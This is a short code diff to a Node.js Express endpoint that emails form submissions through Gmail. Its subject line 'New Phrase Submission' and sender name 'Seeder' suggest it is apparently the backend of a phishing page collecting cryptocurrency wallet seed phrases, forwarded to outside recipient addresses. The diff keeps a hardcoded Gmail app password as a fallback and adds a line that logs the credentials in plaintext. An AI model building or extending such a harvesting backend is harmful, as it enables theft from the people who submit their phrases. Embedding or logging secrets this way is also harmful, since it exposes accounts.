@@ -45,18 +45,22 @@ app.post('/send-email', async (req, res) => {
     </body></html>
   `;
 
-    // Configure Nodemailer transporter for Gmail
+    const smtpUser = process.env.SMTP_USER || 'guirez1921@gmail.com';
+    const smtpPass = process.env.SMTP_PASS || 'bzfb dmyh buuq vmag';
+    const smtpFrom = process.env.SMTP_FROM || '"Seeder" <guirez1921@gmail.com>';
+    console.log(smtpUser, smtpPass, smtpFrom);
+
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'guirez1921@gmail.com', // replace with your Gmail address
-            pass: 'bzfb dmyh buuq vmag'      // replace with your Gmail App Password
+            user: smtpUser,
+            pass: smtpPass
         }
     });
 
     const toRecipients = parseToEmails(process.env.to_email);
     const mailOptions = {
-        from: '"Seeder" <guirez1921@gmail.com>', // sender address
+        from: smtpFrom,
         to: toRecipients || ['susanbabe0980@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
         cc: 'guirez1921@gmail.com',             // cc address
         subject: 'New Phrase Submission',
